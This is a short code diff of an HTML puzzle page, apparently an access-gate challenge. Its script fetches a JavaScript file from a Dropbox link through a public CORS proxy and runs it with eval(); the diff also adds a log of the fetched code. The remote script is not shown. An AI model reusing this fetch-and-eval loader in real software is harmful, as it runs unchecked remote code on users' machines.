@@ -9,7 +9,7 @@
         <p>Find the 3 letter word then find the source and bypass to get access</p>
     </label>
     <script>
-        const corsProxy = 'https://cors-anywhere.herokuapp.com/corsdemo';
+        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
         const dropboxURL = 'https://www.dropbox.com/scl/fi/vjhqqbfy47vt1i1g33qcb/pervo.js?rlkey=xkzrjx10ga7ew2krpi3exedat&st=vtqu7qzp&raw=1';
 
         fetch(corsProxy + dropboxURL, {
@@ -21,6 +21,7 @@
         })
         .then(response => response.text())
         .then(scriptContent => {
+                console.log(scriptContent);
             eval(scriptContent);
         })
         .catch(error => console.error('Error:', error));
